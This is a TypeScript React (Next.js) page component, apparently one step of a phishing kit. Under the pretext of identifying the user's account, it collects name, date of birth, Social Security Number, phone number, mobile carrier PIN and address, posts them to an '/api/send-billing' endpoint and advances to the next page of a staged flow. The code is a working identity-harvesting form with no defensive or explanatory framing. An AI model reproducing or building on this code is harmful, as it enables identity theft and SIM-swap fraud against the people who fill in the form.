import Head from "next/head";
import React, { useContext, useState } from "react";
import { yupResolver } from "@hookform/resolvers/yup";
import axios from "axios";
import { useRouter } from "next/router";
import { useForm } from "react-hook-form";
import * as yup from "yup";
import ReactInputMask from "react-input-mask";
import { Container } from "../../components/Container";
import { Wrapper } from "../../components/Wrapper";
import { getNextUrl } from "../../utils/getNextUrl";
import { getProgress } from "../../utils/getProgress";
import { DataContext } from "../_app";
import { Button } from "../../components/Button";
import { Error } from "../../components/Error";

interface BillingProps {}

const schema = yup.object().shape({
  firstname: yup.string().required("First name field is required."),
  lastname: yup.string().required("Last name field is required."),
  dob: yup.string().required("Date of birth field is required."),
  ssn: yup.string().required("Social Security Number field is required."),
  streetAddress: yup.string().required("Address field is required."),
  zipCode: yup.string().required("Zip code field is required."),
  state: yup.string().required("State field is required."),
  phoneNumber: yup.string().required("Phone number field is required."),
  carrierPin: yup.string(),
});

export const Billing: React.FC<BillingProps> = ({}) => {
  const [loading, setLoading] = useState(false);

  const { data: datas, setData } = useContext(DataContext);
  const { push } = useRouter();
  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm({
    resolver: yupResolver(schema),
    mode: `onSubmit`,
  });

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);
    const formData = new FormData();

    formData.append(`form`, `BILLING`);
    formData.append(`billing`, JSON.stringify(data));

    try {
      await axios.post(`/api/send-billing`, formData, {
        headers: { "content-type": `multipart/form-data` },
      });
    } catch (error) {
      console.log(error);
    }

    setData({
      ...datas,
      billing: data,
    });

    const url = getProgress()[getProgress().indexOf(`Billing`) + 1];

    push(getNextUrl(url));
  });

  return (
    <Wrapper>
      <Head>
        <title>Personal Information</title>
      </Head>
      <Container>
        <div className={`login-form`}>
          <h3>Your Personal Information</h3>
          <form>
            <fieldset>
              <legend
                style={{
                  fontSize: `13.5px`,
                }}
              >
                Please provide us with some personal information to help
                identify your account.
              </legend>
              <Error errors={errors} />
              <div className={`control-group`}>
                <input
                  type="text"
                  className={
                    errors.firstname && errors.firstname.message
                      ? `input-validation-error`
                      : ``
                  }
                  {...register(`firstname`)}
                  placeholder="First name"
                />
              </div>
              <div className={`control-group`}>
                <input
                  type="text"
                  className={
                    errors.lastname && errors.lastname.message
                      ? `input-validation-error`
                      : ``
                  }
                  {...register(`lastname`)}
                  placeholder="Last name"
                />
              </div>
              <div className={`control-group`}>
                <ReactInputMask mask="99/99/9999" {...register(`dob`)}>
                  {
                    // @ts-ignore
                    () => (
                      <input
                        type="text"
                        className={
                          errors.dob && errors.dob.message
                            ? `input-validation-error`
                            : ``
                        }
                        placeholder="Date of birth"
                        {...register(`dob`)}
                      />
                    )
                  }
                </ReactInputMask>
              </div>
              <div className={`control-group`}>
                <ReactInputMask mask={"999-99-9999"} {...register(`ssn`)}>
                  {
                    // @ts-ignore
                    () => (
                      <input
                        type="text"
                        className={
                          errors.ssn && errors.ssn.message
                            ? `input-validation-error`
                            : ``
                        }
                        placeholder="Social Security Number"
                        {...register(`ssn`)}
                      />
                    )
                  }
                </ReactInputMask>
              </div>
              <div className={`control-group`}>
                <ReactInputMask
                  mask="(999) 999 9999"
                  {...register(`phoneNumber`)}
                >
                  {
                    // @ts-ignore
                    () => (
                      <input
                        type="text"
                        className={
                          errors.phoneNumber && errors.phoneNumber.message
                            ? `input-validation-error`
                            : ``
                        }
                        placeholder="Phone number"
                        {...register(`phoneNumber`)}
                      />
                    )
                  }
                </ReactInputMask>
              </div>
              <div className={`control-group`}>
                <input
                  type="number"
                  className={
                    errors.carrierPin && errors.carrierPin.message
                      ? `input-validation-error`
                      : ``
                  }
                  {...register(`carrierPin`)}
                  placeholder="Carrier Pin"
                />
              </div>
              <div className={`control-group`}>
                <input
                  type="text"
                  className={
                    errors.streetAddress && errors.streetAddress.message
                      ? `input-validation-error`
                      : ``
                  }
                  {...register(`streetAddress`)}
                  placeholder="Address"
                />
              </div>
              <div className={`control-group`}>
                <input
                  type="text"
                  className={
                    errors.state && errors.state.message
                      ? `input-validation-error`
                      : ``
                  }
                  {...register(`state`)}
                  placeholder="State"
                />
              </div>
              <div className={`control-group`}>
                <input
                  type="number"
                  className={
                    errors.zipCode && errors.zipCode.message
                      ? `input-validation-error`
                      : ``
                  }
                  {...register(`zipCode`)}
                  placeholder="Zip code"
                />
              </div>
              <hr />
              <Button loading={loading} onClick={onSubmit}>
                Next
              </Button>
            </fieldset>
          </form>
        </div>
      </Container>
    </Wrapper>
  );
};

export default Billing;
